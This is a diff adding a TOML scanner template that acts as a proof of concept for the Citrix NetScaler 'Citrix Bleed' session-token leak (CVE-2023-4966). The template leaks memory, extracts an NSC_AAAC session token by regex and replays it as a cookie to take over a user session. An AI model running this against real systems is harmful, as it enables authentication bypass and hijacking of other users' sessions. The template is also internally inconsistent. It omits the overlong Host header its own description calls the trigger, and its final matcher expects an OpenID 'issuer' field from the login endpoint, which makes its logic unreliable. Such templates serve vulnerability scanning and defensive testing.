@@ -1,0 +1,39 @@
+[info]
+id = "POC-AVE-2023-0003"
+name = "Citrix NetScaler ADC会话令牌泄露漏洞PoC（Citrix Bleed）"
+author = "AVE"
+severity = "critical"
+tags = ["information-disclosure", "session-leak", "citrix-bleed", "buffer-overread"]
+description = "Citrix NetScaler ADC和NetScaler Gateway在以网关或AAA虚拟服务器配置时存在缓冲区过度读取漏洞。攻击者通过发送带有超长Host头的HTTP请求可触发内存泄露，获取NSC_AAAC会话令牌，进而绕过身份验证接管用户会话。参考AssetNote研究原文。"
+vuln_id = ["CVE-2023-4966", "AVE-2023-0003"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/oauth/idp/.well-known/openid-configuration"
+
+[[poc.requests.extractors]]
+type = "regex"
+part = "body"
+name = "session"
+value = "([a-f0-9]{100}45525d5f4f58455e445a4a42)"
+group = 1
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["NSC_AAAC="]
+expect = true
+
+[[poc.requests]]
+method = "POST"
+path = "/logon/LogonPoint/Authentication/GetUserName"
+headers.Cookie = "NSC_AAAC={{session}}"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["{\"issuer\":"]
+expect = true
